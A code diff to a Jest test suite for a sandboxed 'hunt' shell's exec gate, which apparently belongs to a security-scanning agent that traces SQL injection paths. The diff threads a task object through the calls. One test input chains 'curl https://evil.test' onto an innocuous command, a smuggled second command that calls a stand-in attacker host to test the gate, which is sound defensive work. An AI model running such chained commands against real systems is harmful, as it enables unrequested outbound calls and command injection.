@@ -74,6 +74,19 @@ const fakeSandbox = () => ({
   stop: jest.fn().mockResolvedValue(undefined),
 })
 
+/**
+ * LUM-758 §6 — `runHuntShell` needs the task to tell the compressor what is
+ * relevant. It is deliberately NOT told the command: that string has exactly
+ * two destinations (the gate, the shell) and the source-level assertions
+ * below count them.
+ */
+const TASK = {
+  id: 't1',
+  objective: 'trace the `id` query param on lib/a.ts#GET into $queryRawUnsafe',
+  category: 'injection' as const,
+  startingPoints: ['lib/a.ts'],
+}
+
 const handleFor = (vm: ReturnType<typeof fakeSandbox>) => ({
   sandbox: vm as never,
   cwd: '/vercel/r',
@@ -121,7 +134,7 @@ describe('LUM-758 the hunt exec boundary is a single choke point', () => {
   it('runs the byte-identical string the gate checked, as ONE argv entry', async () => {
     const vm = fakeSandbox()
 
-    await runHuntShell({ handle: handleFor(vm), command: COMMAND })
+    await runHuntShell({ handle: handleFor(vm), task: TASK, command: COMMAND })
 
     // The gate saw exactly the caller's string…
     expect(mockChecked).toEqual([COMMAND])
@@ -151,7 +164,11 @@ describe('LUM-758 the hunt exec boundary is a single choke point', () => {
   it('does not normalise the command: leading/trailing whitespace survives too', async () => {
     const vm = fakeSandbox()
 
-    await runHuntShell({ handle: handleFor(vm), command: PADDED_COMMAND })
+    await runHuntShell({
+      handle: handleFor(vm),
+      task: TASK,
+      command: PADDED_COMMAND,
+    })
 
     // The real gate admitted the padded string (this is a pass-through spy),
     // so trimming it would be a silent rewrite of an already-allowed command.
@@ -167,6 +184,7 @@ describe('LUM-758 the hunt exec boundary is a single choke point', () => {
 
     const out = await runHuntShell({
       handle: handleFor(vm),
+      task: TASK,
       command: 'cat a.ts; curl https://evil.test',
     })
 
